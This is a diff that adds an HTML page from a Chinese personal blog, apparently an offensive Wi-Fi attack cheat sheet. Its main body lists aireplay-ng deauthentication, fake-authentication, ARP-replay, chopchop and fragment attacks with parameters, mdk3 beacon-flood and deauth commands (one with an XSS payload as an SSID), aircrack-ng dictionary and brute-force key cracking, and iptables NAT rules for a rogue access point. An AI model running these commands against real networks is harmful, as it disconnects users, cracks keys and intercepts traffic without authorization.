@@ -1,0 +1,242 @@
+
+
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Aireplay-ng攻击模式详解 | XEI7 乱M集</title>
+  <meta name="author" content="XEI7">
+  
+  <meta name="description" content="airbase-ng  -E “ssids-file”  -w “wep-key” wlan0mon
+1mdk3 wlan0monmon b -n &quot;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&quot; -w -g -m -s 15
+mdk3 wlan0mon bmdk3 wlan0mon diwconfig wlan1 txpower 33mdk3 wlan0mon a -a 11:11:22:44:dd:00
+aireplay-ng -1 0 -e ap_essid -a ap_mac -h XXXXXXXXXX ath1aireplay-ng -5 -b ap_mac -h XXXXXXXXXX ath1aireplay-ng -3 -b ap_mac -h XXXXXXXXXX -x 1024 ath1aireplay-ng -0 1 -a 00:00:00:00:00:00 -c BB:BB:BB:BB:BB:BB ath1aireplay-ng -3 -b  -h  -i ath1
+aircrack-ng -x -f 2 .capaircrack-ng -w passdict.txt .capaircrack-ng -n 64 -b apmac .ivsaircrack-ng -w passdict.txt -b 00:00:00:00:00:00 .cap
+然后可以试着用手机连接，应该可以连上但上不了网iptables –t nat –A POSTROUTING –out-interface eth0 –j MASQUERADE命令并回车，设置iptables转发，将所有数据转发到eth0网卡；于是配置NAT
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE   #对eth0进行源natiptables -A FORWARD -i wlan0mon -o eth0 -j ACCEPT #把无线网卡流量转发到有线网卡（或者什么能上网的网卡）上面iptables -A FORWARD -p tcp –syn -s  192.168.0.0/24 -j TCPMSS –set-mss 1356">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Aireplay-ng攻击模式详解"/>
+  <meta property="og:site_name" content="XEI7 乱M集"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/imgs/favicon.ico" rel="icon" type="image/x-ico">
+  <link rel="alternate" href="/atom.xml" title="XEI7 乱M集" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+
+
+<body>
+  <header><div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/imgs/logo.png" alt="XEI7 乱M集" title="XEI7 乱M集"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name">XEI7 乱M集</h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/urls">_</a></li>
+					
+
+				</ul>
+			</nav>			
+</div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header class="article-info clearfix">
+  <h1 itemprop="name">
+	Aireplay-ng攻击模式详解
+  </h1>
+  <p class="article-author">By
+    
+      <a href="https://xei7.github.io" title="XEI7">XEI7</a>
+    </p>
+  <p class="article-time">
+    <time datetime="1912-12-01T00:00:00.000Z" itemprop="datePublished">1912-12-01</time>
+    更新日期:<time datetime="2016-09-01T13:15:22.623Z" itemprop="dateModified">2016-09-01</time>
+    
+  </p>
+</header>
+    <div class="entry">
+		
+        <p>airbase-ng  -E “ssids-file”  -w “wep-key” wlan0mon</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mdk3 wlan0monmon b -n "<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>" -w -g -m -s 15</div></pre></td></tr></table></figure>
+<p>mdk3 wlan0mon b<br>mdk3 wlan0mon d<br>iwconfig wlan1 txpower 33<br>mdk3 wlan0mon a -a 11:11:22:44:dd:00</p>
+<p>aireplay-ng -1 0 -e ap_essid -a ap_mac -h XXXXXXXXXX ath1<br>aireplay-ng -5 -b ap_mac -h XXXXXXXXXX ath1<br>aireplay-ng -3 -b ap_mac -h XXXXXXXXXX -x 1024 ath1<br>aireplay-ng -0 1 -a 00:00:00:00:00:00 -c BB:BB:BB:BB:BB:BB ath1<br>aireplay-ng -3 -b <ap mac=""> -h <my mac=""> -i ath1</my></ap></p>
+<p>aircrack-ng -x -f 2 <em>.cap<br>aircrack-ng -w passdict.txt </em>.cap<br>aircrack-ng -n 64 -b apmac <em>.ivs<br>aircrack-ng -w passdict.txt -b 00:00:00:00:00:00 </em>.cap</p>
+<p>然后可以试着用手机连接，应该可以连上但上不了网<br>iptables –t nat –A POSTROUTING –out-interface eth0 –j MASQUERADE命令并回车，设置iptables转发，将所有数据转发到eth0网卡；<br>于是配置NAT</p>
+<p>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE   #对eth0进行源nat<br>iptables -A FORWARD -i wlan0mon -o eth0 -j ACCEPT #把无线网卡流量转发到有线网卡（或者什么能上网的网卡）上面<br>iptables -A FORWARD -p tcp –syn -s  192.168.0.0/24 -j TCPMSS –set-mss 1356<br><a id="more"></a></p>
+<h3 id="mdk3"><a href="#mdk3" class="headerlink" title="mdk3"></a>mdk3</h3><p>TEST MODES:<br>b   - Beacon Flood Mode<br>      Sends beacon frames to show fake APs at clients.<br>      This can sometimes crash network scanners and even drivers!<br>a   - Authentication DoS mode<br>      Sends authentication frames to all APs found in range.<br>      Too much clients freeze or reset some APs.<br>p   - Basic probing and ESSID Bruteforce mode<br>      Probes AP and check for answer, useful for checking if SSID has<br>      been correctly decloaked or if AP is in your adaptors sending range<br>      SSID Bruteforcing is also possible with this test mode.<br>d   - Deauthentication / Disassociation Amok Mode<br>      Kicks everybody found from AP<br>m   - Michael shutdown exploitation (TKIP)<br>      Cancels all traffic continuously<br>x   - 802.1X tests<br>w   - WIDS/WIPS Confusion<br>      Confuse/Abuse Intrusion Detection and Prevention Systems<br>f   - MAC filter bruteforce mode<br>      This test uses a list of known client MAC Adresses and tries to<br>      authenticate them to the given AP while dynamically changing<br>      its response timeout for best performance. It currently works only<br>      on APs who deny an open authentication request properly<br>g   - WPA Downgrade test<br>      deauthenticates Stations and APs sending WPA encrypted packets.<br>      With this test you can check if the sysadmin will try setting his<br>      network to WEP or disable encryption.<br>mdk3 –help <test modes=""><br>      -n <ssid> Use SSID <ssid> instead of randomly generated ones<br>      -f <filename> Read SSIDs from file<br>      -v <filename> Read MACs and SSIDs from file. See example file!<br>      -d Show station as Ad-Hoc<br>      -w Set WEP bit (Generates encrypted networks)<br>      -g Show station as 54 Mbit<br>      -t Show station using WPA TKIP encryption<br>      -a Show station using WPA AES encryption<br>      -m Use valid accesspoint MAC from OUI database<br>      -h Hop to channel where AP is spoofed<br>         This makes the test more effective against some devices/drivers<br>         But it reduces packet rate due to channel hopping.<br>      -c <chan> Fake an AP on channel <chan>. If you want your card to hop on<br>         this channel, you have to set -h option, too!<br>      -s <pps> Set speed in packets per second (Default: 50)</pps></chan></chan></filename></filename></ssid></ssid></test></p>
+<p>airbase-ng -P -C 500 -z 4 -c6 -i wlan0mon -F log wlan0mon<br>genpmk -f wordlist.txt -d pmkpre -s “WLAN”<br>airolib-ng PMKaircrack –import cowpatty  pmkpre<br>aircrack-ng -r PMKaircrak log.cap</p>
+<h3 id="aircrack"><a href="#aircrack" class="headerlink" title="aircrack"></a>aircrack</h3><p>attack modes (Numbers can still be used): 攻击模式，最具杀伤力的地方</p>
+<p>–deauth count : 不信任一切 (-0)<br>–fakeauth delay : 欺骗AP的信任 (-1)<br>–interactive : 交互的选择 (-2)<br>–arpreplay : 标准的 ARP-request replay (-3)<br>–chopchop : 解密 WEP 包 (-4)<br>–fragment : 生成有效的 key流 (-5)<br>–caffe-latte : 从客户端获取新的 IVs (-6)<br>–cfrag : 对客户端进行碎片攻击 (-7)<br>–test : 测试注射及效果 (-9)<br>-0 Deautenticate 冲突模式<br>使已经连接的合法客户端强制断开与路由端的连接，使其重新连接。在重新连接过程中获得验证数据包，从而产生有效 ARP request。<br>如果一个客户端连在路由端上，但是没有人上网以产生有效数据，此时，即使用-3 也无法产生有效 ARP request。所以此时需要用-0 攻击模式配合，-3 攻击才会被立刻激活。<br>aireplay-ng -0 10 –a <ap mac=""> -c <my mac=""> wifi0 参数说明：<br>【-0】：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）<br>【-a】：设置 ap 的 mac<br>【-c】：设置已连接的合法客户端的 mac。<br>如果不设置-c，则断开所有和 ap 连接的合法客户端。<br>aireplay-ng -3 -b <ap mac=""> -h <my mac=""> wifi0<br>注：使用此攻击模式的前提是必须有通过认证的合法的客户端连接到路由器<br>-1 fakeauth count 伪装客户端连接<br>这种模式是伪装一个客户端和 AP 进行连接。<br>这步是无客户端的研究学习的第一步，因为是无合法连接的客户端，因此需要一个伪装客户端来和路由器相连。为让 AP 接受数据包，必须使自己的网卡和 AP 关联。如果没有关联的话，目标 AP 将忽略所有从你网卡发送的数据包，IVS 数据将不会产生。<br>用-1 伪装客户端成功连接以后才能发送注入命令，让路由器接受到注入命令后才可反馈数据从而产生 ARP 包。<br>aireplay-ng -1 0 –e <ap essid=""> -a <ap mac=""> -h <my mac=""> wifi0<br>参数说明：<br>【-1】：伪装客户端连接模式，后面跟延时<br>【-e】：设置 ap 的 essid<br>【-a】：设置 ap 的 mac<br>【-h】：设置伪装客户端的网卡 MAC（即自己网卡 mac）<br>-2 Interactive 交互模式<br>这种攻击模式是一个抓包和提数据发攻击包，三种集合一起的模式<br>1．这种模式主要用于研究学习无客户端，先用-1 建立虚假客户端连接然后直接发包攻击 ,<br>    aireplay-ng -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b <ap mac=""> -h <my mac=""> wifi0<br>    参数说明：<br>    【-2】：交互攻击模式<br>    【-p】：设置控制帧中包含的信息（16 进制），默认采用 0841<br>    【-c】：设置目标 mac 地址<br>    【-b】：设置 ap 的 mac 地址<br>    【-h】：设置伪装客户端的网卡 MAC（即自己网卡 mac）<br>    2．提取包，发送注入数据包 aireplay-ng -2 –r <file> -x 1024 wifi0 发包攻击.其中，-x 1024 是限定发包速度，避免网卡死机，可以选择 1024。<br>    -3 ARP-request 注入攻击模式<br>    这种模式是一种抓包后分析重发的过程 这种攻击模式很有效。既可以利用合法客户端，也可以配合-1 利用虚拟连接的伪装客户端。如果有合法客户端那一般需要等几分钟，让合法客户端和 ap 之间通信，少量数据就可产生有效 ARP request 才可利用-3模式注入成功。如果没有任何通信存在，不能得到 ARP request.，则这种攻击就会失败。<br>    如果合法客户端和ap之间长时间内没有 ARP request，可以尝试同时使用-0 攻击. 如果没有合法客户端，则可以利用-1 建立虚拟连接的伪装客户端，连接过程中获得验证数据包，从而产生有效 ARP request。再通过-3 模式注入。<br>    aireplay-ng -3 -b <ap mac=""> -h <my mac=""> -x 512 wifi0<br>    参数说明：<br>    【-3】：arp 注入攻击模式<br>    【-b】：设置 ap 的 mac<br>    【-h】：设置<br>    【-x】：定义每秒发送数据户包的数量，但是最高不超过 1024，建议使用 512（也可不定义）<br>    -4 Chopchop 攻击模式<br>    用以获得一个包含密钥数据的 xor 文件 这种模式主要是获得一个可利用包含密钥数据的 xor 文件，不能用来解密数据包。而是用它来产生一个新的数据包以便我们可以进行注入。<br>    aireplay-ng -4 -b <ap mac=""> -h <my mac=""> wifi0 参数说明：<br>    【-b】：设置需要研究学习的 AP 的 mac<br>    【-h】：设置虚拟伪装连接的 mac（即自己网卡的 mac）<br>    -5 fragment 碎片包攻击模式<br>    用以获得 PRGA(包含密钥的后缀为 xor 的文件) 这种模式主要是获得一个可利用 PRGA，这里的 PRGA 并不是 wep key 数据，不能用来解密数据包。而是用它来产生一个新的数据包以便我们可以进行注入。其工作原理就是使目标 AP 重新广播包，当 AP 重广播时，一个新的 IVS 将产生，我们就是利用这个来研究学习 !<br>    aireplay-ng -5 -b <ap mac=""> -h <my mac=""> wifi0<br>    【-5】：碎片包攻击模式<br>    【-b】：设置 ap 的 mac<br>    【-h】：设置虚拟伪装连接的 mac（即自己网卡的 mac）<br>    Packetforge-ng：数据包制造程序 Packetforge-ng <mode> <options>Mode<br>    【-0】：伪造 ARP 包<br>    packetforge-ng -0 -a <ap mac=""> -h <my mac=""> wifi0 –k 255.255.255.255 -l 255.255.255.255–y&lt;.xor file&gt; -w mrarp<br>    参数说明：<br>    【-0】：伪装 arp 数据包<br>    【-a】：设置 ap 的 mac<br>    【-h】设置虚拟伪装连接的 mac（即自己的 mac）<br>    【-k】<ip[:port]>说明：设置目标文件 IP 和端口<br>    【-l】<ip[:port]>说明：设置源文件 IP 和端口<br>    【-y】<file>说明：从 xor 文件中读取 PRGA。后面跟 xor 的文件名。<br>    【-w】设置伪装的 arp 包的文件名 Aircrack-ng：WEP 及 WPA-PSK key 研究学习主程序<br>    Aircrack-ng [optin] &lt;.cap/.ivs file&gt;Optin aircrack-ng -n 64 -b <ap mac=""> name-01.ivs )<br>    参数说明：<br>    【-n】：设置 WEP KEY 长度（64/128/152/256/512）aircrack-ng -x -f 2 name-01h.cap<br>    参数说明：<br>    【-x】：设置为暴力研究学习模式<br>    【-f】：设置复杂程度，wep 密码设置为 1，wpa 密码设置为 2 aircrack-ng -w password.txt ciw.cap<br>    【-w】：设置为字典研究学习模式，后面跟字典文件，再后面跟是我们即时保存的那个捕获到 WPA 验证的抓包文件。</ap></file></ip[:port]></ip[:port]></my></ap></options></mode></my></ap></my></ap></my></ap></file></my></ap></my></ap></ap></my></ap></my></ap></p>
+
+    </div>
+    <footer>
+        
+  
+  <div class="categories">
+    <a href="/categories/安全/">安全</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/wifi/">wifi</a>, <a href="/tags/aircrack/">aircrack</a>
+  </div>
+ 
+        <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+ <nav id="pagination" >
+    
+    <a href="/1912/12/01/Metasploit自动化/" class="alignleft prev" title="Metasploit自动化">Metasploit自动化</a>
+    
+    
+    <a href="/1912/12/01/五行-木火土金水/" class="alignright next" title="五行:木火土金水">五行:木火土金水</a>
+    
+    <div class="clearfix"></div>
+</nav>
+
+
+
+	
+	<section id="comment">
+		<!-- 多说评论框 start -->
+		<div class="ds-thread" data-thread-key="1912/12/01/Aireplay-ng攻击模式详解/" data-title="Aireplay-ng攻击模式详解" data-url="https://xei7.github.io/1912/12/01/Aireplay-ng攻击模式详解/"></div>
+		<!-- 多说评论框 end -->
+		<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+		<script type="text/javascript">
+		var duoshuoQuery = {short_name:"xei7"};
+		(function() {
+			var ds = document.createElement('script');
+			ds.type = 'text/javascript';ds.async = true;
+			ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+			ds.charset = 'UTF-8';
+			(document.getElementsByTagName('head')[0] 
+			 || document.getElementsByTagName('body')[0]).appendChild(ds);
+		})();
+		</script>
+		<!-- 多说公共JS代码 end -->
+	</section>
+	
+</div></div>
+    <aside id="sidebar" class="alignright">
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/bluetooth/">bluetooth</a><small>2</small></li>
+  
+    <li><a href="/categories/kali/">kali</a><small>3</small></li>
+  
+    <li><a href="/categories/linux/">linux</a><small>2</small></li>
+  
+    <li><a href="/categories/python/">python</a><small>1</small></li>
+  
+    <li><a href="/categories/sdr/">sdr</a><small>1</small></li>
+  
+    <li><a href="/categories/sqlmap/">sqlmap</a><small>3</small></li>
+  
+    <li><a href="/categories/web/">web</a><small>7</small></li>
+  
+    <li><a href="/categories/中医/">中医</a><small>4</small></li>
+  
+    <li><a href="/categories/安全/">安全</a><small>5</small></li>
+  
+    <li><a href="/categories/网络/">网络</a><small>1</small></li>
+  
+    <li><a href="/categories/逆向/">逆向</a><small>2</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/aircrack/" style="font-size: 10px;">aircrack</a> <a href="/tags/bash/" style="font-size: 10px;">bash</a> <a href="/tags/bluetooth/" style="font-size: 12.5px;">bluetooth</a> <a href="/tags/cookie/" style="font-size: 10px;">cookie</a> <a href="/tags/elf/" style="font-size: 12.5px;">elf</a> <a href="/tags/kali/" style="font-size: 12.5px;">kali</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/rtl-sdr/" style="font-size: 10px;">rtl-sdr</a> <a href="/tags/sqlmap/" style="font-size: 12.5px;">sqlmap</a> <a href="/tags/sqlmapapi/" style="font-size: 10px;">sqlmapapi</a> <a href="/tags/waf/" style="font-size: 10px;">waf</a> <a href="/tags/web/" style="font-size: 17.5px;">web</a> <a href="/tags/wifi/" style="font-size: 10px;">wifi</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/中医/" style="font-size: 15px;">中医</a> <a href="/tags/五行/" style="font-size: 10px;">五行</a> <a href="/tags/养生/" style="font-size: 12.5px;">养生</a> <a href="/tags/审计/" style="font-size: 10px;">审计</a> <a href="/tags/工控/" style="font-size: 10px;">工控</a> <a href="/tags/批量/" style="font-size: 10px;">批量</a> <a href="/tags/易经/" style="font-size: 10px;">易经</a> <a href="/tags/端口/" style="font-size: 10px;">端口</a> <a href="/tags/笔记/" style="font-size: 20px;">笔记</a> <a href="/tags/绕过/" style="font-size: 10px;">绕过</a> <a href="/tags/重装/" style="font-size: 10px;">重装</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+  </div>
+</div>
+
+
+  <div class="widget tag">
+<h3 class="title">友情链接</h3>
+<ul class="entry">
+<li><a href="http://blog.sina.com.cn/3838120958 " title=" Blog" target="_blank">_</a></li>
+</ul>
+</div>
+</aside>
+    <div class="clearfix"></div>
+  </div>
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<!--script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"-->
+</script>
+</body>
+</html>
+
+
